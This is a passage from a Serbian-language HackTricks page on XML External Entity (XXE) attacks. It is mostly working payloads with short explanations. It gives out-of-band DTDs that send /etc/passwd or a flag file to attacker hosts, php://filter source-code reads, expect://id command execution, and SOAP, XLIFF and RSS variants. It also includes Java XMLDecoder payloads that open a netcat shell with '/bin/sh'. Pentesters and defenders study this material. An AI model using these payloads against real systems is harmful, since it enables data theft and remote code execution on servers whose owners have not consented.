Imajte na umu da se koriste **numerički HTML entiteti** (kao što je \[u ovom primeru]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTD primer: 

DTD (Document Type Definition) je jezik koji se koristi za definisanje strukture XML dokumenata. DTD definiše elemente, atribute i entitete koji se mogu koristiti u XML dokumentu. DTD se često koristi za validaciju XML dokumenata i obezbeđuje jasno definisane pravila za njihovu strukturu.

Evo jednostavnog primera DTD-a:

```xml
<!DOCTYPE root [
  <!ELEMENT root (element1, element2)>
  <!ELEMENT element1 (#PCDATA)>
  <!ELEMENT element2 (#PCDATA)>
]>
<root>
  <element1>Primer</element1>
  <element2>DTD</element2>
</root>
```

U ovom primeru, DTD definiše da se `root` element sastoji od `element1` i `element2` elemenata. Oba elementa mogu sadržati samo tekstualne podatke (`#PCDATA`). XML dokument koji se slaže sa ovim DTD-om mora imati tačno ovu strukturu.
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP omotači

### Base64

**Izvuci** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Izdvajanje spoljnog resursa**

XML External Entity (XXE) napad je tehnika koja omogućava napadaču da izvuče ili ubaci spoljni resurs u XML dokument. Ova tehnika se zasniva na slabosti u obradi eksternih entiteta u XML parserima.

Napadač može iskoristiti XXE napad da bi dobio pristup osetljivim informacijama, kao što su sistemski fajlovi, baze podataka ili druge resurse na serveru. Takođe, napadač može izvršiti udaljeni napad izvršavanjem zlonamernog koda.

Da bi izveo XXE napad, napadač mora da ubaci zlonamerni XML kod koji sadrži referencu na eksterni entitet. Kada XML parser obradi dokument, on će pokušati da učita eksterni entitet, što omogućava napadaču da izvuče ili ubaci spoljni resurs.

Postoje različiti načini za izvođenje XXE napada, uključujući upotrebu ENTITY deklaracija, DTD (Document Type Definition) eksternih entiteta i parametara zahteva.

Da biste se zaštitili od XXE napada, preporučuje se korišćenje sigurnih XML parsera koji isključuju obradu eksternih entiteta ili pravilno konfigurisanje postojećih parsera. Takođe je važno validirati i filtrirati korisnički unos kako bi se sprečilo ubacivanje zlonamernog XML koda.
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Udaljeno izvršavanje koda

**Ako je učitan PHP modul "expect"**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**

SOAP (Simple Object Access Protocol) je protokol za razmenu struktuiranih poruka između aplikacija. Međutim, SOAP može biti podložan napadima na XML eksterne entitete (XEE).

XML eksterne entitete (XEE) su entiteti koji se referišu na eksterne resurse putem URI-a. Napadač može iskoristiti XEE napad da bi dobio pristup osetljivim informacijama ili izvršio udaljeni kod.

Da bi izvršio XEE napad, napadač mora da ubaci zlonamerni XML sadržaj koji sadrži eksterne entitete. Kada aplikacija parsira XML, ona će pokušati da resoluje ove entitete, što može dovesti do curenja osetljivih podataka ili izvršavanja udaljenog koda.

Da biste se zaštitili od XEE napada, preporučuje se sledeće:

- Koristite najnoviju verziju SOAP biblioteke koja ima ugrađene sigurnosne mehanizme protiv XEE napada.
- Validirajte ulazne XML poruke kako biste sprečili ubacivanje zlonamernog sadržaja.
- Isključite podršku za eksterne entitete u XML parseru.
- Koristite bezbedne metode za obradu XML podataka, kao što je SAX parser umesto DOM parsera.

Primenom ovih mera, možete smanjiti rizik od XEE napada i zaštititi svoje SOAP aplikacije od potencijalnih bezbednosnih propusta.
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Ovaj primer je inspirisan [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)

XLIFF (XML Localization Interchange File Format) se koristi za standardizaciju razmene podataka u procesima lokalizacije. To je XML bazirani format koji se uglavnom koristi za prenos lokalizabilnih podataka između alata tokom lokalizacije i kao zajednički format razmene za CAT (Computer-Aided Translation) alate.

### Analiza slepe zahteva

Zahtev se šalje serveru sa sledećim sadržajem:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Međutim, ovaj zahtev izaziva internu serversku grešku, tačnije pominje problem sa deklaracijama obeležavanja:
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
Uprkos grešci, zabeležen je pogodak na Burp Collaboratoru, što ukazuje na određeni nivo interakcije sa spoljnom entitetom.

Izvlačenje podataka van mreže
Za izvlačenje podataka, šalje se modifikovani zahtev:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Ovaj pristup otkriva da User Agent ukazuje na korišćenje Java 1.8. Primećeno ograničenje ove verzije Jave je nemogućnost dobijanja datoteka koje sadrže znak za novi red, kao što je /etc/passwd, koristeći tehniku van opsega.

Izvlačenje podataka na osnovu grešaka
Da bi se prevazišlo ovo ograničenje, koristi se pristup na osnovu grešaka. DTD datoteka je strukturirana na sledeći način kako bi izazvala grešku koja uključuje podatke iz ciljne datoteke:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Server odgovara sa greškom, bitno je da se odražava nepostojeći fajl, što ukazuje da server pokušava pristupiti navedenom fajlu:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Da biste uključili sadržaj datoteke u poruku o grešci, DTD datoteka se prilagođava:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Ova modifikacija dovodi do uspešnog izvlačenja sadržaja datoteke, kako je prikazano u grešci koja se šalje putem HTTP-a. Ovo ukazuje na uspešan XXE (XML External Entity) napad, koji koristi tehnike Out of Band i Error-Based za izvlačenje osetljivih informacija.


## RSS - XEE

Validan XML sa RSS formatom za iskorišćavanje XXE ranjivosti.

### Ping back

Jednostavan HTTP zahtev ka serveru napadača
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Čitanje fajla

XML eksterni entitet (XXE) napad omogućava napadaču da pročita sadržaj fajla na serveru. Ovaj napad se izvodi ubacivanjem zlonamernog XML koda koji referiše na eksterni entitet koji sadrži putanju do ciljanog fajla. Kada server parsira XML zahtev, on će pokušati da učita sadržaj fajla i vratiti ga napadaču.

Da biste izveli XXE napad, prvo morate pronaći ranjivu tačku na ciljanom serveru koja parsira XML zahteve. Zatim, ubacite zlonamerni XML kod koji referiše na eksterni entitet koji sadrži putanju do fajla koji želite da pročitate. Kada server pokuša da učita sadržaj fajla, on će ga vratiti kao odgovor na vaš zahtev.

Ovaj napad može biti veoma opasan, jer omogućava napadaču da pristupi osetljivim informacijama, kao što su lozinke, konfiguracioni fajlovi ili baze podataka. Da biste se zaštitili od XXE napada, preporučuje se da se koristi sigurno parsiranje XML-a i da se izbegava upotreba eksternih entiteta u XML kodu.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Čitanje izvornog koda

Korišćenje PHP base64 filtera
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE to RCE

XMLDecoder je Java klasa koja kreira objekte na osnovu XML poruke. Ako zlonamerni korisnik može da natera aplikaciju da koristi proizvoljne podatke u pozivu metode **readObject**, trenutno će dobiti izvršavanje koda na serveru.

### Korišćenje Runtime().exec()
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder

ProcessBuilder je klasa u Javi koja se koristi za izgradnju i pokretanje vanjskih procesa. Ova klasa omogućava programerima da pokrenu vanjske programe iz svoje Java aplikacije.

Da biste koristili ProcessBuilder, prvo morate stvoriti instancu ove klase. Zatim možete konfigurirati vanjski proces postavljanjem njegovih argumenta, okoline i radnog direktorija. Nakon što ste konfigurirali vanjski proces, možete ga pokrenuti pozivom metode `start()`.

Ova klasa je korisna u mnogim scenarijima, uključujući izvršavanje vanjskih skripti, pokretanje drugih programa ili manipulaciju s operativnim sustavom.

Primjer korištenja ProcessBuilder-a:

```java
ProcessBuilder processBuilder = new ProcessBuilder("ls", "-l");
processBuilder.directory(new File("/home/user"));
Process process = processBuilder.start();
```

U ovom primjeru, stvaramo instancu ProcessBuilder-a s argumentima "ls" i "-l". Zatim postavljamo radni direktorij na "/home/user". Nakon toga, pokrećemo vanjski proces pozivom metode `start()`.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## Alati

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## Reference

* [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
* [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
* Izvlačenje informacija putem HTTP-a koristeći sopstveni eksterni DTD: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
* [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
* [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
* [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
